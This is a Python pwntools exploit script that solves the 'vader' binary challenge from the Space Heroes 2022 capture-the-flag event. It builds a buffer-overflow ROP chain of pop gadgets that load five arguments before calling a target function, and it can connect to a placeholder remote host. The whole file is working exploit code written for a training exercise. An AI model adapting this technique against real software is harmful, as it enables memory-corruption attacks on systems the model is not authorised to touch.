#!/usr/bin/env python3
#Good tutorial by CryptoCat at https://github.com/Crypto-Cat/CTF/tree/main/ctf_events/space_heroes_22
from pwn import *

exe = ELF('vader')

context.binary = exe
context.log_level='debug'

#La sequenza dei parametri è pop rdi, rsi, rdx, rcx, r8
pop_rdi = 0x000000000040165b # pop rdi; ret; 
pop_rsi_r15 = 0x0000000000401659 # pop rsi; pop r15; ret;
pop_rdx = 0x00000000004011ce  #pop rdx; ret; 
pop_rcx_r8 = 0x00000000004011d8 # pop rcx; pop r8; ret;

#####
gadget1 = 0x4011c9
gadget2 = 0x4011d3

ret2win = 0x40146a

def conn():
    if args.REMOTE:
        io = remote("addr", 1337)
    else:
        io = process([exe.path])
        if args.DEBUG:
            gdb.attach(io)

    return io


io = conn()

payload = flat([
    b'A'*40,
    pop_rdi,
    0x402104,
    pop_rsi_r15,
    0x4021b4,
    0x0,
    pop_rdx,
    0x402266,
    pop_rcx_r8,
    0x402315,
    0x4023c3,
    exe.functions.vader
    #ret2win
    ])

write('payload', payload)

io.sendline(payload)
io.interactive()
